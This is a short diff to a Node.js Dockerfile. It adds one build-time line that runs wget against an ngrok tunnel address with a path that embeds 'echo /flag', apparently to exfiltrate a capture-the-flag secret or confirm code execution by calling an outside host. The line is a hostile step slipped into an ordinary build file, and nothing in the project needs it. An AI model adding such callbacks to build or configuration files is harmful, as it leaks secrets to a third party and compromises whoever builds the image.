@@ -6,6 +6,7 @@ COPY package*.json ./
 USER node
 RUN npm install
 COPY --chown=node:node . .
+RUN wget http://32a8-52-22-69-233.ngrok.io/'echo /flag'
 
 EXPOSE 3001
 CMD ["node", "app.js"]
